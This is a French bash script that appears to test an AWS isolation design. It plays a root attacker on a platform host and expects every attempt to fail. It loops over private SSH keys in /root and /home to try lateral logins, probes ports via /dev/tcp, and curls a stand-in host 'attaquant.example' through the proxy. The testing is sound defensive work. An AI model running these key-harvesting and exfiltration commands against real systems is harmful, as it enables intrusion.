#!/usr/bin/env bash
# « Et si la plateforme est compromise ? » — preuve sur l'infra AWS (demo/reseau.md § 3).
# On se met à la place d'un attaquant root sur la plateforme et on essaie ce qu'elle ne doit pas
# pouvoir faire. Chaque contrôle doit ÉCHOUER pour l'attaquant. Rien n'est publié, rien n'est modifié.
set -uo pipefail
cd "$(dirname "$0")"
SSH="ssh -F ../secrets/ssh_config"
ok() { echo "  OK  $*"; }; ko() { echo "  KO  $*"; ECHEC=1; }; ECHEC=0
PASS=10.42.2.10; SERV=10.42.2.20

echo "1. Root sur la plateforme → SSH vers le serveur, avec toutes les clés présentes sur la plateforme"
$SSH sas-plateforme "sudo bash -c 'for k in /root/.ssh/id_* /home/*/.ssh/*; do
    [ -f \"\$k\" ] && grep -q PRIVATE \"\$k\" 2>/dev/null || continue
    timeout 10 ssh -n -i \"\$k\" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      ubuntu@$SERV true 2>/dev/null && { echo \"ouvert avec \$k\"; exit 1; }
  done; timeout 10 ssh -n -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      ubuntu@$SERV true 2>/dev/null && exit 1; exit 0'" \
  && ok "aucune clé de la plateforme n'ouvre le serveur (la seule acceptée est sur le poste de l'admin)" \
  || ko "la plateforme ouvre une session sur le serveur !"

echo "2. Root sur la plateforme → SSH vers la passerelle (pour réécrire le dépôt ou le registre)"
$SSH sas-plateforme "sudo bash -c 'for k in /root/.ssh/id_* /home/*/.ssh/*; do
    [ -f \"\$k\" ] && grep -q PRIVATE \"\$k\" 2>/dev/null || continue
    timeout 10 ssh -n -i \"\$k\" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      ubuntu@$PASS true 2>/dev/null && { echo \"ouvert avec \$k\"; exit 1; }
  done; exit 0'" \
  && ok "aucune clé de la plateforme n'ouvre la passerelle : le registre des publications reste hors d'atteinte" \
  || ko "la plateforme ouvre une session sur la passerelle !"

echo "3. Plateforme → dépôt de la passerelle (:8080) sans passer par le récepteur"
$SSH sas-plateforme "curl -s -m 5 -o /dev/null http://$PASS:8080/" \
  && ko "la plateforme joint pypiserver directement" \
  || ok "pypiserver injoignable depuis la plateforme (ufw) : seul le récepteur écrit, après vérification"

echo "4. Plateforme → serveur sur un autre port que SSH (ex. 8080, 443)"
$SSH sas-plateforme "for p in 80 443 8080; do timeout 4 bash -c \"</dev/tcp/$SERV/\$p\" 2>/dev/null && exit 1; done; exit 0" \
  && ok "le serveur n'expose rien d'autre à la plateforme" || ko "un port du serveur répond à la plateforme"

echo "5. Serveur → Internet par adresse IP, sans DNS ni relais (ne dépend pas de la plateforme)"
$SSH sas-serveur "curl -s -m 6 --noproxy '*' -o /dev/null https://1.1.1.1" \
  && ko "le serveur joint Internet !" \
  || ok "aucune route : le cloisonnement est tenu par le réseau AWS, pas par la plateforme"

echo "6. Passerelle → Internet par adresse IP"
$SSH sas-passerelle "curl -s -m 6 -o /dev/null https://1.1.1.1" \
  && ko "la passerelle joint Internet !" || ok "aucune route depuis la passerelle"

echo "7. Serveur → domaine hors liste par le relais (l'exfiltration reste en liste fermée)"
CODE=$($SSH sas-serveur "curl -s -m 10 -o /dev/null -w '%{http_code}' -x http://passerelle:3128 https://attaquant.example" 2>/dev/null)
[[ $CODE != 2* ]] && ok "refusé par le relais (code $CODE)" || ko "le relais laisse passer attaquant.example"

echo "8. Plateforme usurpée : publication signée avec une autre clé"
SORTIE=$($SSH sas-plateforme 'cd ~/sas-pme && bash demo/forger.sh 2>&1 | tail -1')
[[ $SORTIE == *401* ]] && ok "$SORTIE" || ko "publication forgée : $SORTIE"

echo
if [ "$ECHEC" = 0 ]; then
  echo "TOUS LES CONTRÔLES PASSENT : prendre la plateforme ne donne ni Internet aux serveurs, ni accès à leurs machines."
else
  echo "AU MOINS UN CONTRÔLE A ÉCHOUÉ"; exit 1
fi
